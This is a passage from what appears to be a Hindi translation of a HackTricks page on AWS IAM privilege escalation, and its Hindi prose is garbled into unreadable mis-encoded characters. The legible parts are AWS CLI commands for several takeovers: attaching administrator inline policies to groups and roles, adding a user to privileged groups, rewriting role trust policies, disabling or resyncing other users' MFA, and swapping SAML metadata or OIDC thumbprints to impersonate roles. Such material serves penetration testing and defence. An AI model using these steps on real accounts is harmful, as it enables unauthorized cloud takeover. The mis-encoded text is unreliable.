**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕реАрдзреЗ рдХрд┐рд╕реА рднреА рдЪреАрдЬрд╝ рдХреЗ рд▓рд┐рдП privescред

### `iam:PutGroupPolicy`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ `iam:PutGroupPolicy` рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ **рдЙрд╕ рд╕рдореВрд╣ рдХреЗ рд▓рд┐рдП рдПрдХ рдЗрдирд▓рд╛рдЗрди рдиреАрддрд┐ рдмрдирд╛рдХрд░ рдпрд╛ рдЕрдкрдбреЗрдЯ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рд╡рд╣ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ**, рдЙрд╕ рдиреАрддрд┐ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЬреЛрдбрд╝рддреЗ рд╣реБрдПред
```bash
aws iam put-group-policy --group-name <group_i_am_in> \
--policy-name "group_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
рдЬрд╣рд╛рдВ рд╕рдореВрд╣ **рд╡рд╣ рд╕рдореВрд╣ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реИ**ред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕реАрдзреЗ рдХрд┐рд╕реА рднреА рдЪреАрдЬрд╝ рдХреЗ рд▓рд┐рдП privescред

### `iam:PutRolePolicy`, ( `sts:AssumeRole`|`iam:createrole`)

**`iam:PutRolePolicy`** рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛рд╡рд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИ **рдЙрд╕ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдЗрдирд▓рд╛рдЗрди рдиреАрддрд┐ рдмрдирд╛рдХрд░ рдпрд╛ рдЕрдкрдбреЗрдЯ рдХрд░рдХреЗ рдЬрд┐рд╕ рддрдХ рдЙрдирдХреА рдкрд╣реБрдБрдЪ рд╣реИ**, рдЙрд╕ рдиреАрддрд┐ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рдЬреЛрдбрд╝рддреЗ рд╣реБрдПред

рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХрдорд╛рдВрдб рдЗрд╕ рддрд░рд╣ рджрд┐рдЦ рд╕рдХрддреА рд╣реИ:
```bash
aws iam put-role-policy --role-name <role_i_can_assume> \
--policy-name "role_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
рдЬрд╣рд╛рдВ рднреВрдорд┐рдХрд╛ рдПрдХ рдРрд╕реА рднреВрдорд┐рдХрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `sts:AssumeRole` рдХреЗ рд╕рд╛рде рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдорд╛рди рд╕рдХрддрд╛ рд╣реИред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕реАрдзреЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдХреБрдЫ рднреА рдХреЗ рд▓рд┐рдПред

### `iam:AddUserToGroup`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **`iam:AddUserToGroup`** рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ AWS рдЦрд╛рддреЗ рдореЗрдВ рдПрдХ рдореМрдЬреВрджрд╛ IAM рд╕рдореВрд╣ рдореЗрдВ **рдЦреБрдж рдХреЛ рдЬреЛрдбрд╝рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```bash
aws iam add-user-to-group --group-name <target_group> --user-name <my_username>
```
**рдЬрд╣рд╛рдВ **target\_group рдХреЗ рдкрд╛рд╕ рдЕрдзрд┐рдХ/рднрд┐рдиреНрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рд╣реЛрддреЗ рд╣реИрдВ рдЬрд┐рддрдиреЗ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдХрд┐рд╕реА рднреА рд╕рдореВрд╣ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privescред

### `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole`

рдЬрд┐рд╕ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ `iam:UpdateAssumeRolePolicy` рдФрд░ `sts:AssumeRole` рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реЛрддреА рд╣реИрдВ, рд╡рд╣ **рдХрд┐рд╕реА рднреА рдореМрдЬреВрджрд╛ рднреВрдорд┐рдХрд╛ рдХреА рдорд╛рди рд▓реЗрдиреЗ рд╡рд╛рд▓реА рдиреАрддрд┐ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рдмрджрд▓рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо** рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡реЗ рдЙрд╕ рднреВрдорд┐рдХрд╛ рдХреЛ рдорд╛рди рд╕рдХреЗрдВред
```bash
aws iam update-assume-role-policy --role-name <role_to_assume> \
--policy-document file:///path/to/assume/role/policy.json
```
рдЬрд╣рд╛рдВ рдиреАрддрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреА рддрд░рд╣ рджрд┐рдЦрддреА рд╣реИ, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рднреВрдорд┐рдХрд╛ рдЧреНрд░рд╣рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдХрд┐рд╕реА рднреА рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privescред

### `iam:UploadSSHPublicKey`

`iam:DeactivateMFADevice` рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **SSH рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ IAM рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ**([рдФрд░ рдЬрд╛рдиреЗрдВ](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_UploadSSHPublicKey.html))ред

рдЗрд╕ рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ SSH рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЗрд╡рд▓ **рд╕рдВрдмрджреНрдз IAM рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ CodeCommit рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ**ред SSH рдХреБрдВрдЬрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ CodeCommit рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреИрд╕реЗ рдХрд░реЗрдВ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП, _CodeCommit User Guide_ рдореЗрдВ [Set up CodeCommit for SSH connections](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-credentials-ssh.html) рджреЗрдЦреЗрдВред
```bash
aws iam upload-ssh-public-key --user-name <value> \
--ssh-public-key-body <value>
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** CodeCommit рдХреЗ рд▓рд┐рдП рдЕрдкреНрд░рддреНрдпрдХреНрд╖ privescред

### `iam:DeactivateMFADevice`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ `iam:DeactivateMFADevice` рд╣реИ, рд╡рд╣ **рдирд┐рд░реНрджрд┐рд╖реНрдЯ MFA рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ рдЙрд╕реЗ рдЙрд╕ IAM рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдЕрд▓рдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ ([рдФрд░ рдЬрд╛рдиреЗрдВ](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_DeactivateMFADevice.html))ред
```bash
aws iam deactivate-mfa-device --user-name <value> --serial-number <value>
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдпрджрд┐ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрд╕рдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдирддреЗ рд╣реИрдВ рддреЛ MFA рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдХреЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ privesc рдХрд░реЗрдВред

### `iam:ResyncMFADevice`

`iam:ResyncMFADevice` рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдирд┐рд░реНрджрд┐рд╖реНрдЯ MFA** рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рдПрдХ IAM рдЗрдХрд╛рдИ рдХреЗ рд╕рд╛рде рд╕рд┐рдВрдХреНрд░рдирд╛рдЗрдЬрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рднреВрдорд┐рдХрд╛ ([рдФрд░ рдЬрд╛рдиреЗрдВ](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_ResyncMFADevice.html))ред
```bash
aws iam resync-mfa-device --user-name <value> --serial-number <value> \
--authentication-code1 <value> --authentication-code2 <value>
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдпрджрд┐ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдирддреЗ рд╣реИрдВ, рддреЛ рдЖрдк MFA рдбрд┐рд╡рд╛рдЗрд╕ рдЬреЛрдбрд╝рдХрд░ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ privesc рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЖрдк **SAML рдХрдиреЗрдХреНрд╢рди рдХреЗ XML рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред рдлрд┐рд░, рдЖрдк **SAML рд╕рдВрдШ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ** рдХрд┐рд╕реА рднреА **рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЗрд╕ рдкрд░ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░ рд░рд╣реА рд╣реЛ**ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдРрд╕рд╛ рдХрд░рдиреЗ рд╕реЗ **рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧрд┐рди рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк XML рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рдЖрдк рдЕрдкрдирд╛ XML рдбрд╛рд▓ рд╕рдХреЗрдВ, рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХреЗрдВ рдФрд░ рдкрд┐рдЫрд▓реЗ рдХреЛ рд╡рд╛рдкрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХреЗрдВред
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: рдПрдХ рдРрд╕рд╛ рдЯреВрд▓ рдЬреЛ SAML рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЬреЗрдирд░реЗрдЯ рдХрд░ рд╕рдХреЗ рдФрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд░реЛрд▓ рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХреЗред
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(рдЗрд╕ рдмрд╛рд░реЗ рдореЗрдВ рдирд┐рд╢реНрдЪрд┐рдд рдирд╣реАрдВ) рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдпреЗ **рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реЛрдВ, рддреЛ рд╡рд╣ рдПрдХ рдирдпрд╛ **Thumbprint** рдЬреЛрдбрд╝рдХрд░ рдкреНрд░рджрд╛рддрд╛ рдХреЛ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рд░реЛрд▓реНрд╕ рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░ рд╕рдХрддрд╛ рд╣реИред

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
## рд╕рдВрджрд░реНрдн

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
